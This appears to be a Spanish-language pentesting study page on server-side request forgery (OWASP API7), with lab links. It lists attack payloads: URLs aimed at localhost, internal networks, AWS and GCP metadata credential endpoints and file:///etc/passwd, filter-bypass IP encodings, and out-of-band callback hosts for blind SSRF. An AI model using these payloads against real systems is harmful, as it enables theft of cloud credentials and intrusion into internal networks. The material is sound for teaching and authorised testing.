# SSRF — Server-Side Request Forgery (API7)

**SSRF** ocurre cuando la API acepta una **URL o recurso** que tú controlas y el **servidor** la solicita por ti. Esto convierte al servidor en tu proxy: puedes hacer que acceda a recursos **internos** que tú no alcanzas directamente (servicios en `localhost`, la red interna, o metadatos del cloud).

Es **API7** del OWASP API Top 10.

---

## Cómo se ve

Un endpoint que recibe una URL (para una preview, un webhook, importar una imagen, etc.):

```http
POST /api/v1/fetch-image HTTP/1.1
Content-Type: application/json

{"url":"https://ejemplo.com/foto.png"}
```

Cambias la URL por un recurso interno:

```json
{"url":"http://127.0.0.1:8080/admin"}
{"url":"http://localhost/server-status"}
{"url":"http://169.254.169.254/latest/meta-data/"}
```

Si el servidor devuelve el contenido de ese recurso interno → SSRF.

---

## Objetivos clásicos

| Objetivo | URL | Por qué |
| -------- | --- | ------- |
| Servicios internos | `http://127.0.0.1:<puerto>/` | Paneles y APIs solo accesibles desde la propia máquina. |
| Metadatos AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Roba credenciales temporales del rol IAM. |
| Metadatos GCP | `http://metadata.google.internal/computeMetadata/v1/` (cabecera `Metadata-Flavor: Google`) | Tokens de servicio. |
| Red interna | `http://10.0.0.5/`, `http://192.168.1.10/` | Pivotar a otras máquinas. |
| Ficheros locales | `file:///etc/passwd` | Si acepta el esquema `file://`. |
| Escaneo de puertos | `http://127.0.0.1:22`, `:3306`… | Detectar servicios por tiempos/errores. |

> El endpoint de **metadatos del cloud** (`169.254.169.254`) es el objetivo estrella: suele entregar **credenciales** del rol de la instancia, lo que convierte un SSRF en una toma de control de la infraestructura.

---

## Dónde buscarlo

Cualquier parámetro que contenga o referencie una URL/host/recurso:

```text
url=   uri=   path=   dest=   redirect=   feed=   host=
webhook=   callback=   image=   file=   document=   proxy=
```

También en funcionalidades: importar desde URL, generar PDF/captura, validar webhooks, "comprobar si la web está activa".

---

## Bypass de filtros

Si filtran `localhost`/`127.0.0.1`, prueba representaciones alternativas:

| Técnica | Ejemplo |
| ------- | ------- |
| IP decimal | `http://2130706433/` (= 127.0.0.1) |
| IP octal / hex | `http://0177.0.0.1/`, `http://0x7f.0.0.1/` |
| Dominios que resuelven a interno | `http://localtest.me`, servicios tipo `*.nip.io` |
| Abuso de `@` | `http://esperado.com@127.0.0.1/` |
| Redirección abierta | Apuntar a una URL tuya que redirige (302) al recurso interno. |
| IPv6 | `http://[::1]/` |

---

## Blind SSRF

Si no ves la respuesta, confirma que el servidor hace la petición usando un **servidor bajo tu control** (OAST):

```text
http://<tu-id>.oast.pro/        (Burp Collaborator)
http://<tu-id>.oastify.com/
```

Si recibes la interacción DNS/HTTP, el SSRF existe aunque sea "ciego". A partir de ahí, explotas por tiempos o rutas conocidas.

---

## Impacto

Acceso a servicios internos no expuestos, robo de credenciales del cloud (escalada a toda la infraestructura), pivoting hacia la red interna y, en algunos casos, RCE encadenando con servicios internos vulnerables (Redis, etc.).

---

> **Consejo:** siempre que un parámetro acepte una URL, prueba `http://169.254.169.254/` (cloud) y `http://127.0.0.1/` con varios puertos. Si es ciego, usa Burp Collaborator. El SSRF es de los pocos fallos web que escalan directamente a comprometer la nube entera.

---

## Dónde practicar el SSRF

| Lab | Qué probar | Enlace |
| --- | ---------- | ------ |
| PortSwigger — SSRF | Labs gratis (muy completos) | https://portswigger.net/web-security/ssrf |
| [OWASP crAPI](./Laboratorios/OWASP%20crAPI.md) | Campo de la subida de mecánico que acepta URL | https://github.com/OWASP/crAPI |

```flow
Localizar :: Un parámetro que acepte una URL/recurso.
Apuntar :: A 127.0.0.1 y a 169.254.169.254 (metadatos cloud).
Confirmar :: Ver la respuesta interna o usar Burp Collaborator (ciego).
```

> **Consejo:** el objetivo estrella es `http://169.254.169.254/latest/meta-data/` (credenciales del cloud). Los labs de SSRF de PortSwigger enseñan además a saltarse filtros con redirecciones y codificaciones de IP.
